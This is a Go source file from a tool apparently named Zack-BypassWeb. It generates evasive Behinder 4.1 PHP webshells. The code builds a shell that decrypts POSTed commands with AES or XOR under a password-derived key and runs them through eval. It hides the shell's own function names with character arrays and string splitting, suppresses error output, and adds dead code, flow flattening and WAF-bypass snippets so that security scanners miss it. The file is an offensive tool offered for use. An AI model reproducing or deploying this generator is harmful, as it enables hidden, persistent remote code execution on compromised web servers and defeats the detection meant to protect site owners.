// Zack-BypassWeb - 冰蝎4.1 免杀Webshell生成框架
// Copyright (C) 2024 Zack
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

package generator

import (
	"fmt"
	"Zack-BypassWeb/pkg/evasion"
	"Zack-BypassWeb/pkg/utils"
	"strings"
)

type PHPGenerator struct {
	*Base
	phpVars *evasion.PHPVarPool
}

func NewPHPGenerator(opts Options) *PHPGenerator {
	return &PHPGenerator{Base: NewBase(opts, 25), phpVars: evasion.NewPHPVarPool(30)}
}

func (g *PHPGenerator) Generate() Result {
	pass := g.GetKey()
	passMD5 := utils.MD5Half(pass)
	code := g.genBehinder(pass, passMD5)

	code = strings.ReplaceAll(code, "/*$$WAF$$*/", g.GetWAFCode())

	// Lv.3: extra dead code blocks outside main ?>
	if g.Opts.EvasionLvl >= 3 {
		for i := 0; i < 3; i++ {
			if dead := g.Dead.Generate(); dead != "" {
				code += "\n<?php " + dead + " ?>\n"
			}
		}
	}

	return Result{
		Code: code,
		Note: fmt.Sprintf("冰蝎4.1 PHP | 密码: %s | Lv.%d", pass, g.Opts.EvasionLvl),
		Key:  passMD5,
	}
}

func (g *PHPGenerator) genBehinder(pass, passMD5 string) string {
	p := g.phpVars.GetN(18)
	keyVar    := p[0]
	postVar   := p[1]
	arrVar    := p[2]
	funcVar   := p[3]
	paramsVar := p[4]
	className := p[5][1:]
	iVar      := p[6]
	tVar      := p[7]
	sessKey   := p[8]
	bodyVar   := p[9]
	objVar    := p[10] // object variable for direct __invoke call

	// Build all components
	evalCode   := g.buildEval(paramsVar)
	base64Func := g.buildBase64Decode(tVar)
	deadInside := ""
	if g.Opts.EvasionLvl >= 2 {
		deadInside = g.buildPHPDead()
	}

	// Inner decryption + execution block
	inner := Render(`@0@ = @1@(@2@, @3@);
@4@ = @5@(@0@);
@6@(@0@);
@7@
if (@8@) {
    @4@ = @13@(@4@, @14@, @12@);
} else {
    @9@
    @4@ = @10@(@4@ . "");
    for (@11@ = 0; @11@ < strlen(@4@); @11@++) {
        @4@[@11@] = @4@[@11@] ^ @12@[@11@ + 1 & 15];
    }
}
@15@
@16@
class @17@ { public function __invoke(@18@) { @19@ } }
@20@ = new @17@(); @20@(@18@);
@21@`,
		bodyVar,       // @0@
		`fopen`,        // @1@
		`"php://"."input"`, // @2@
		`"r"`,          // @3@
		postVar,        // @4@
		`stream_get_contents`, // @5@
		`fclose`,       // @6@
		g.Comment.Generate(), // @7@
		g.buildOpensslCheck(),  // @8@
		base64Func,     // @9@
		tVar,           // @10@
		iVar,           // @11@
		keyVar,         // @12@
		g.buildOpensslCall(),   // @13@
		`"AES"."128"`,  // @14@
		g.Comment.Generate(),   // @15@
		g.buildExplode(arrVar, postVar, funcVar, paramsVar), // @16@
		className,      // @17@
		paramsVar,      // @18@
		evalCode,       // @19@
		objVar,         // @20@ -> used twice (obj=cls; obj(params))
		deadInside,     // @21@
	)

	// Lv.2+: flow flattening
	if g.Opts.EvasionLvl >= 2 {
		inner = g.Flow.WrapCondition(inner)
	}

	// Hide session functions using variables
	return Render(`<?php
@0@
/*$$WAF$$*/
@1@("@2@"); @3@("@4@", "@5@");
@6@
@7@
?>`,
		`@error_reporting(0);`,                            // @0@
		`call_user_func`,                                   // @1@
		`session_start`,                                    // @2@
		`ini_set`,                                          // @3@
		`display_errors`,                                   // @4@
		`0`,                                                // @5@
		g.buildSessionAssign(keyVar, passMD5, sessKey),     // @6@
		inner,                                              // @7@
	)
}

func (g *PHPGenerator) buildSessionAssign(keyVar, passMD5, sessKey string) string {
	return Render(`@0@ = "@1@";
@2@ = "k";
$_SESSION[@2@] = @0@;
@3@(@4@);`,
		keyVar, passMD5, sessKey,
		`call_user_func`, `"session_write_close"`)
}

func (g *PHPGenerator) buildOpensslCheck() string {
	if g.Opts.EvasionLvl < 2 {
		return `function_exists('openssl_decrypt')`
	}
	return `("function_"."exists")('openssl_decrypt')`
}

func (g *PHPGenerator) buildOpensslCall() string {
	if g.Opts.EvasionLvl < 2 {
		return `openssl_decrypt`
	}
	methods := []string{
		`("openssl_"."decrypt")`,
		`join('',array('o','p','e','n','s','s','l','_','d','e','c','r','y','p','t'))`,
	}
	return methods[utils.RandInt(0, len(methods)-1)]
}

func (g *PHPGenerator) buildExplode(arrVar, postVar, funcVar, paramsVar string) string {
	if g.Opts.EvasionLvl < 2 {
		return Render(`@0@ = explode('|', @1@); @2@ = @0@[0]; @3@ = @0@[1];`,
			arrVar, postVar, funcVar, paramsVar)
	}
	methods := []string{
		Render(`@0@ = explode(chr(124), @1@); @2@ = @0@[0]; @3@ = @0@[1];`,
			arrVar, postVar, funcVar, paramsVar),
		Render(`@0@ = preg_split('/\|/', @1@); @2@ = @0@[0]; @3@ = @0@[1];`,
			arrVar, postVar, funcVar, paramsVar),
	}
	return methods[utils.RandInt(0, len(methods)-1)]
}

func (g *PHPGenerator) buildBase64Decode(tVar string) string {
	if g.Opts.EvasionLvl < 2 {
		return Render(`@0@ = "base64_" . "decode";`, tVar)
	}
	methods := []string{
		Render(`@0@ = ""; $a = array(98,97,115,101,54,52,95,100,101,99,111,100,101); foreach($a as $v) @0@ .= chr($v);`, tVar),
		Render(`@0@ = join('', array('b','a','s','e','6','4','_','d','e','c','o','d','e'));`, tVar),
	}
	return methods[utils.RandInt(0, len(methods)-1)]
}

func (g *PHPGenerator) buildEval(paramsVar string) string {
	methods := []string{
		fmt.Sprintf(`eval(%s . "");`, paramsVar),
		fmt.Sprintf(`@eval(%s . "");`, paramsVar),
		fmt.Sprintf(`@eval/**/(%s . "");`, paramsVar),
	}
	return methods[utils.RandInt(0, len(methods)-1)]
}

func (g *PHPGenerator) buildPHPDead() string {
	v := g.phpVars.GetAll()
	if len(v) < 2 {
		return ""
	}
	patterns := []string{
		Render(`if (isset($GLOBALS['@0@']) && function_exists('@1@')) { @2@ = '@3@'.'@4@'; }`,
			utils.RandString(6), utils.RandString(7), v[0], utils.RandString(5), utils.RandString(4)),
		Render(`if (false && extension_loaded('@0@')) { @1@ = php_uname('@2@'); }`,
			utils.RandString(5), v[0], utils.RandString(1)[:1]),
		Render(`if (0 && defined('@0@')) { ini_set('@1@', '@2@'); }`,
			strings.ToUpper(utils.RandString(5)), utils.RandString(6), utils.RandString(4)),
		Render(`if ('@0@' === getenv('@1@') && false) { @2@ = md5('@3@'); }`,
			utils.RandString(6), strings.ToUpper(utils.RandString(5)), v[0], utils.RandString(4)),
	}
	return patterns[utils.RandInt(0, len(patterns)-1)]
}
